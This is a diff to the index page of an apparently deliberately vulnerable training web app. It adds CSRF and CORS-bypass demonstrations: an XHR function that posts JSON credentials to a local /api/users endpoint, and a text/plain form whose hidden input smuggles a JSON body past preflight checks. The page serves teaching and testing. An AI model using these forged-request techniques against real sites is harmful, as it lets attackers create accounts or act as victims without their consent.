@@ -15,6 +15,22 @@ table td {
   border-top: 5px solid #fff;
 }
 </style>
+<script>
+var payload = JSON.stringify({"username":"user@email.com", "password":"123456"})
+function create_user(type) {
+  var http;
+  http = new XMLHttpRequest();
+  http.open("POST", "http://localhost:5000/api/users", true)
+  http.setRequestHeader('Content-Type', type)
+  http.onreadystatechange = function() {
+    if (http.readyState == 4) {
+      var response = http.responseText;
+      console.log(response);
+    }
+  }
+  http.send(payload)
+}
+</script>
 </head>
 <body>
 <center>
@@ -52,8 +68,17 @@ table td {
   <td><b>CSRF</b>
   <td>
     <ol>
-      <li><a href="http://localhost:5000/csrf">Edge Case Discovery</a></li>
-      <li><a href="http://localhost:5000/clickjack">Edge Case Exploitation</a></li>
+      <li><a href="http://localhost:5000/csrf">Edge Case #1 Discovery</a></li>
+      <li><a href="http://localhost:5000/clickjack">Edge Case #1 Exploitation</a></li>
+      <li><a href="http://localhost:5000/cors-bypass">Edge Case #2 Demo</a></li>
+      <li><input type="button" value="XHR JSON" onclick="create_user('application/json');" /></li>
+      <li><input type="button" value="XHR Plain" onclick="create_user('text/plain');" /></li>
+      <li>
+        <form action="http://localhost:5000/api/users" enctype="text/plain" method="POST">
+          <input type="hidden" name='{"username":"user@email.com", "password":"123456", "foo' value='":"bar"}' />
+          <input type="submit" value="POST Plain" onclick="this.form.submit();" />
+        </form>
+      </li>
     </ol>
   </td>
   </tr>
